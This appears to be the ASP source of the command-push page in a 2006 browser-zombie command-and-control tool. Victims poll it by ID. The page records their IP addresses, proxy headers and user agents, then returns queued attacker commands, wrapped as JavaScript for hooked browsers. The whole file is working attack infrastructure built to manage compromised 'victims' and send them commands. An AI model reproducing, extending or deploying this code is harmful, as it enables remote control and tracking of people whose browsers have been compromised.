<%
' Push Commands to Requested Victim
' Victim needs to make request by their Victim IDs

'10/08/2006
'	- Started
'
'14/08/2006
'	- Add update shown records
'31/10/2006
'	- Performance related improvements and better zombie management
%>
<!--#include file="db.asp" -->
<%

Dim RsCommands, VictimID, First
VictimID = fm_Qnstr("v")

'Victim ID is wrong just say NO
If VictimID = 0 Then 
	PrintCommands NO_RECORD
	Response.End
End If

	Dim RsCurVictim

	getRs RsCurVictim, "SELECT TOP 1 ID FROM Victim WHERE VictimID = " & VictimID & " AND IP = '" & fm_SQL(Request.ServerVariables("REMOTE_HOST")) & "' ORDER BY ID DESC"

	If RsCurVictim.EOF And RsCurVictim.BOF Then
		'Living...
		Dim values(5)
		values(0) = "IP"
		values(1) = Request.ServerVariables("REMOTE_HOST")
		values(2) = "text"
		values(3) = "VictimID"
		values(4) = VictimID
		values(5) = "number"

		fm_Insert "Victim", values

	Else
		Dim upvalues(2)
		upvalues(0) = "Lastseen"
		upvalues(1) = ""
		upvalues(2) = "datenow"
						
		fm_Update "Victim", "ID", RsCurVictim("ID"), upvalues

	End If

	fmKill RsCurVictim

	'Check first time here?
	If CheckRecord("SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = " & VictimID) Then InsertVictimDetail()

	'Get Commands and Print in out Command format
	getRs RsCommands, "SELECT TOP " & MAX_COMMAND & " Command FROM Log WHERE VictimID = " & VictimID & " AND ResponseTime Is Null AND Shown = 0"
	
	Dim CommandBuffer 

	First = True
	If Not RsEmpty(RsCommands) Then
		
		While Not RsCommands.EOF
		
			'Write Commands
			If Not First Then CommandBuffer = CommandBuffer & COMMAND_SEPERATOR
			CommandBuffer = CommandBuffer & RsCommands("Command") 
			
			First = False
			
			RsCommands.MoveNext
		Wend

		PrintCommands CommandBuffer

			'// No max record bug !
			'// Update pushed commands
			Dim RsPushedCommands
			Set RsPushedCommands = Server.CreateObject("ADODB.Command")
			RsPushedCommands.ActiveConnection = fmconn
			RsPushedCommands.CommandText = "UPDATE Log SET Shown = 1 WHERE VictimID = " & VictimID & " AND ResponseTime Is Null AND Shown = 0"
			RsPushedCommands.CommandType = 1
			RsPushedCommands.CommandTimeout = 0
			RsPushedCommands.Prepared = true
			RsPushedCommands.Execute()

			Set RsPushedCommands = Nothing

	Else
		PrintCommands NO_RECORD

	End If

	fmKill RsCommands



'// Print commands in requeired format
Sub PrintCommands(ByVal Cmd)
	
	Select Case COMMUNICATIONCHANNEL
		Case JSMODEL
			'// TODO : Escape JS special characters 

			Cmd = Replace(Cmd, """","\""")
			Cmd = Replace(Cmd, VbNewline,"\n")
			Cmd = Replace(Cmd, Chr(10),"\n")

			Response.Write "function c(){ return """ & Cmd & """};"
		
		Case Else
			Response.Write Cmd

	End Select

End Sub


Sub InsertVictimDetail()
		Dim proxyArr, serverRes, Data
		proxyArr = Array ("HTTP_X_FORWARDED_FOR","HTTP_VIA","HTTP_CACHE_CONTROL","HTTP_FORWARDED","HTTP_USER_AGENT_VIA","HTTP_CACHE_INFO")

		'Gather
		Dim i 
		For i=0 To Ubound(proxyArr)
			serverRes = Request.ServerVariables(proxyArr(i))
			If serverRes <> "" Then Data = Data & DATA_SEPERATOR & serverRes
		Next

		'Living...
		Dim values(11)
		values(0) = "IP"
		values(1) = Request.ServerVariables("REMOTE_HOST")
		values(2) = "text"
		values(3) = "Data"
		values(4) = Data
		values(5) = "text"
		values(6) = "VictimID"
		values(7) = VictimID
		values(8) = "number"
		values(9) = "RawUserAgent"
		values(10) = Request.ServerVariables("HTTP_USER_AGENT")
		values(11) = "text"

		fm_Insert "VictimDetail", values
End Sub


'Check any record exits uses Rs(0)
Function CheckRecord(ByVal SQL)
	
	Dim rsCheck, Ret
	getRs rsCheck, SQL

	'empty...
	Ret = ( rsCheck(0) = 0 )

	fmKill rsCheck

	CheckRecord = Ret
End Function

%>